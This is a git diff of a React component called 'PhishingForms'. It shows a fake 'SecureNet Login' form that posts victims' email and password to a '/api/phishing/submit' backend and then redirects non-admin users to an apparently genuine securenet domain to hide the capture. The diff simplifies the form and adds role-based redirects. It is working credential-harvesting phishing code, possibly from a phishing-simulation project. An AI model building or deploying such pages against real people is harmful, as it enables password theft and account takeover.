@@ -2,9 +2,8 @@ import React, { useState, useEffect } from 'react';
 import axios from 'axios';
 
 const PhishingForms = () => {
-  const [email, setEmail] = useState('');
   const [password, setPassword] = useState('');
-  const [userId, setUserId] = useState('');
+  const [email, setEmail] = useState('');
 
   useEffect(() => {
     const user_agent = navigator.userAgent;
@@ -22,17 +21,37 @@ const PhishingForms = () => {
     e.preventDefault();
 
     try {
-      await axios.post('http://localhost:5000/api/phishing/submit', {
-        user_id: userId,
-        email,
+      // Send login request to backend
+      const res = await axios.post('http://localhost:5000/api/phishing/submit', {
+        email: email,
         password
       });
-      alert('Submitted successfully!');
-      setEmail('');
+
+      console.log(res);
+
+      // If backend returns user info and role, store in localStorage
+      if (res.data && res.data.user && res.data.user.role) {
+        localStorage.setItem('user', JSON.stringify({
+          email: res.data.user.email,
+          role: res.data.user.role
+        }));
+        // Optionally redirect admin to dashboard
+        if (res.data.user.role === 'admin') {
+          alert('Login successful!');
+          window.location.href = '/dashboard'; // Adjust route as needed
+        }
+        else {
+          window.location.href = 'https://securenet.jhubafrica.com';
+        }
+      } else {
+        alert('Submitted successfully!');
+      }
+
       setPassword('');
-      setUserId('');
+      setEmail('');
     } catch (err) {
       console.error('No response from server:', err);
+      alert('Login failed!');
     }
   };
 
@@ -40,15 +59,6 @@ const PhishingForms = () => {
     <div style={styles.container}>
       <form onSubmit={handleSubmit} style={styles.form}>
         <h2 style={styles.title}>🔐 SecureNet Login</h2>
-
-        <input
-          style={styles.input}
-          type="text"
-          placeholder="User ID"
-          value={userId}
-          onChange={(e) => setUserId(e.target.value)}
-          required
-        />
 
         <input
           style={styles.input}
@@ -65,7 +75,7 @@ const PhishingForms = () => {
           placeholder="Password"
           value={password}
           onChange={(e) => setPassword(e.target.value)}
-          required
+          
         />
 
         <button type="submit" style={styles.button}>Login</button>
